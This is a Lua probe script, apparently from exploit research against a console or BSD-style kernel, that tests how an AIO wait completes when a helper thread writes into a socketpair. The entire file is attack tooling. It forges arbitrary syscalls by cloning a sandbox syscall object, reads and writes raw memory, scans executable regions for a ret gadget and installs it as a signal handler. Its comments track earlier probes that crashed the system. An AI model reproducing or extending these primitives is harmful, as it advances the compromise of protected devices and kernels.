-- CRASH_CLASS: MODERATE
-- PROBE 790a: complete the request from a helper thread instead of a signal
--
-- Context: interrupting aio_multi_wait with SIGALRM works (787a) but the runs
-- that followed an interrupt plus a later socket feed took the app down in a
-- state the system could not reap (788a). The natural path is different: a
-- helper Lua thread writes into the socket peer while the main thread sits in
-- the wait, so the read completes and the wait returns through its normal
-- wake path. No signal in the normal case; the watchdog is armed only as a
-- safety net so a failed completion is a measurement, not a wedge.
--
-- Every step prints, so a death names its own line.

print("=== PROBE 790a: COMPLETION VIA HELPER THREAD ===")
print("[S0] start")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "string" then return #v == 1 and string.byte(v) or 0 end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end
local function ascii(a, n)
    local s = {}
    for i = 0, n - 1 do
        local b = to_num(memory.read_byte(a + i))
        if b == 0 then break end
        s[#s + 1] = string.char(b)
    end
    return table.concat(s)
end
print("[S1] helpers")

local SIGACTION, SETITIMER, CLOCK, SOCKETPAIR = 416, 83, 232, 135
local AIO_WAIT, AIO_POLL, AIO_SUBMIT, AIO_CANCEL = 663, 664, 669, 666
local SIGALRM = 14

local ts = to_num(memory.alloc(0x40))
local sa = to_num(memory.alloc(0x40))
local sao = to_num(memory.alloc(0x40))
local itv = to_num(memory.alloc(0x40))
local sink = to_num(memory.alloc(0x4000))
local req = to_num(memory.alloc(0x200))
local ids = to_num(memory.alloc(0x100))
local states = to_num(memory.alloc(0x100))
local idout = to_num(memory.alloc(0x40))
local fds = to_num(memory.alloc(64))
local wbuf = to_num(memory.alloc(0x100))
local hts = to_num(memory.alloc(0x40))
local flag = to_num(memory.alloc(0x40))
print(string.format("[S2] allocs req=%08X sink=%08X flag=%08X", req, sink, flag))

local function clear(buf, n)
    for i = 0, n - 1 do wd(buf + i * 4, 0) end
end
local function now_ms()
    clear(ts, 16)
    make_syscall(CLOCK)(U(4), U(ts), Z)
    return rd(ts) * 1000 + math.floor(rd(ts + 8) / 1000000)
end
print("[S3] clock ok")

-- watchdog (safety net only)
local STRIDE, MAX = 72, 512
local rbuf = to_num(memory.alloc(STRIDE * MAX + 0x100))
local countp = to_num(memory.alloc(16))
wq(countp, Z)
local ok674 = pcall(function() return make_syscall(674)(U(rbuf), U(STRIDE), U(MAX), U(countp), U(0x40000000), Z) end)
local count = rd(countp)
print(string.format("[S4] 674 ok=%s regions=%d", tostring(ok674), count))
if count > MAX then count = MAX end
local exec_lo, exec_hi = nil, nil
for i = 0, count - 1 do
    local b = rbuf + i * STRIDE
    if (rd(b + 0x18) % 8) >= 4 then
        local lo = rd(b) + rd(b + 4) * 4294967296
        local hi = rd(b + 8) + rd(b + 12) * 4294967296
        if ascii(b + 0x20, 0x18):find("executable") and (exec_hi == nil or (hi - lo) > (exec_hi - exec_lo)) then
            exec_lo, exec_hi = lo, hi
        end
    end
end
print(string.format("[S5] exec=%s", exec_lo and string.format("%08X-%08X", exec_lo, exec_hi) or "none"))
local ret_gadget = nil
if exec_lo then
    for off = 0, math.min(exec_hi - exec_lo - 4, 0x180000), 4 do
        local v = rd(exec_lo + off)
        if v % 256 == 0xC3 then ret_gadget = exec_lo + off; break end
        if math.floor(v / 256) % 256 == 0xC3 then ret_gadget = exec_lo + off + 1; break end
        if math.floor(v / 65536) % 256 == 0xC3 then ret_gadget = exec_lo + off + 2; break end
        if math.floor(v / 16777216) % 256 == 0xC3 then ret_gadget = exec_lo + off + 3; break end
    end
end
print(string.format("[S6] ret=%s", ret_gadget and string.format("%08X", ret_gadget) or "none"))
local watchdog_ok = false
if ret_gadget then
    clear(sa, 32)
    wq(sa, U(ret_gadget))
    wd(sa + 8, 0)
    watchdog_ok = (sgn(make_syscall(SIGACTION)(U(SIGALRM), U(sa), U(sao))) == 0)
end
print(string.format("[S7] watchdog=%s", tostring(watchdog_ok)))

-- [A] pending request
local sr0 = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
local rfd, wfd = rd(fds), rd(fds + 4)
for i = 0, 15 do wd(wbuf + i * 4, 0x41 + i) end
clear(hts, 8); wq(hts, Z); wq(hts + 8, U(300000000))
wd(flag, 0); wd(flag + 4, 0)
wq(req + 0x00, Z)
wq(req + 0x08, U(16))
wq(req + 0x10, U(sink))
wq(req + 0x18, U(sink + 0x2000))
wd(req + 0x20, rfd)
wd(req + 0x24, 0)
local sr = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req), U(1), U(3), U(idout), Z))
local id = rd(idout)
wd(ids, id)
wd(states, 0xDEADBEEF)
sgn(make_syscall(AIO_POLL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[A] socketpair=%d submit=%d id=%s state=%s rfd=%d wfd=%d",
    sr0, sr, hx(id), hx(rd(states)), rfd, wfd))

-- [B] helper writes to the peer after 300 ms
local body = ([[
local function U(a) return uint64(string.format("0x%%08X%%08X", math.floor(a/4294967296), a%%4294967296)) end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
pcall(function() make_syscall(240)(U(%d), U(0)) end)
local r = -999
pcall(function() r = make_syscall(4)(U(%d), U(%d), U(16), U(0), U(0), U(0)) end)
pcall(function() memory.write_dword(%d, r) end)
pcall(function() memory.write_dword(%d, 1) end)
]]):format(hts, wfd, wbuf, flag + 4, flag)
local ok, thr = pcall(function() return run_lua_code_in_new_thread(body, { async = true }) end)
print(string.format("[B] helper=%s", tostring(ok)))

-- [C] the wait should return as soon as the helper's write lands
if watchdog_ok then
    clear(itv, 32); wq(itv + 16, U(5))
    sgn(make_syscall(SETITIMER)(U(0), U(itv), Z))
end
wd(states, 0xDEADBEEF)
local t0 = now_ms()
local wr = sgn(make_syscall(AIO_WAIT)(U(ids), U(1), U(states), Z, Z, Z))
local dt = now_ms() - t0
if watchdog_ok then
    clear(itv, 32); sgn(make_syscall(SETITIMER)(U(0), U(itv), Z))
end
print(string.format("[C1] wait ret=%d elapsed=%dms state=%s", wr, dt, hx(rd(states))))
print(string.format("[C2] helper done=%d write_ret=%d", rd(flag), sgn(rd(flag + 4))))
print(string.format("[C3] sink0=%s result=%s", hx(rd(sink)), hx(rd(sink + 0x2000))))

wd(states, 0xDEADBEEF)
local pr = sgn(make_syscall(AIO_POLL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[D] poll=%d state=%s", pr, hx(rd(states))))

if watchdog_ok then sgn(make_syscall(SIGACTION)(U(SIGALRM), U(sao), Z)) end
clear(states, 4)
pcall(function() return make_syscall(AIO_CANCEL)(U(ids), U(1), U(states), Z, Z, Z) end)
print("=== PROBE 790a DONE ===")
